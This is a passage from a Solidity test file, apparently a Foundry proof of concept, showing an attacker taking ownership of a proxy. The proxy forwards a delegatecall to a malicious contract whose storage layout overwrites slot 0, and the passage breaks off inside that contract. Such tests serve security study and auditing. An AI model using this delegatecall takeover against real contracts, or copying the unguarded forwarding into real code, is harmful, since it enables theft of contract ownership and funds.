        address initialOwner = address(uint160(uint256(slot0)));
        assertEq(initialOwner, address(this), "Deployer should be initial owner");

        // Attacker invokes delegatecall to malicious contract
        vm.prank(attacker);
        proxy.forward(
            address(maliciousContract),
            abi.encodeWithSignature("setOwner(address)", attacker)
        );

        // Verify attacker became new owner via storage slot 0
        bytes32 slot0Updated = vm.load(proxyAddress, bytes32(uint256(0)));
        address newOwner = address(uint160(uint256(slot0Updated)));
        assertEq(newOwner, attacker, "Attacker should be new owner");
    }
}

// Malicious contract designed to manipulate proxy's storage
contract AddressUser {
    // Matches proxy's storage slot 0 layout
    address public owner;

    // Function to overwrite owner when delegatecalled from proxy
    function setOwner(address _newOwner) public {
